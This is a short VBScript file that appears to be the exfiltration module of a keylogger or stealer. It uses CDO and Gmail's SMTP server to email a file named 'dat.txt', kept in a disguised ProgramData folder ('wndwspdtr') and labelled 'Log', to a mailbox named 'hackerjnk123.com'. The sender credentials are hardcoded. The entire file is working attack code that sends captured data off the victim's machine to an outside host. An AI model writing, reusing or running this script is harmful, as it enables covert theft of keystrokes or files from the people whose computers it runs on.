Option Explicit
Dim objMessage, Email, EPass


Email = "hackerjnk123.com" 'E-mail sender
EPass = "ilovetohack" 'Password sender


Set objMessage = CreateObject("CDO.Message") 'Creates objMessage
 objMessage.Subject = "Subject Here"
 objMessage.From = "hackerjnk123.com" 'Sender
 objMessage.To = "hackerjnk123.com" 'Receiver (can be the same as sender)
 objMessage.TextBody = "Log" 'e-mail 
 objMessage.AddAttachment "C:\ProgramData\wndwspdtr\dat.txt" 'Adds 'dat.txt' to the e-mail

 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
 
 'Name or IP of Remote SMTP Server
 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"

 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1

 'Your UserID on the SMTP server
 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendusername") = Email

 'Your password on the SMTP server
 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = EPass

 'Server port (typically 25)
 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = "25"

 'Use SSL for the connection (False or True)
 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True

 'Connection Timeout in seconds (the maximum time CDO will try to establish a connection to the SMTP server)
 objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 60

 objMessage.Configuration.Fields.Update
 objMessage.Send 'Sends message


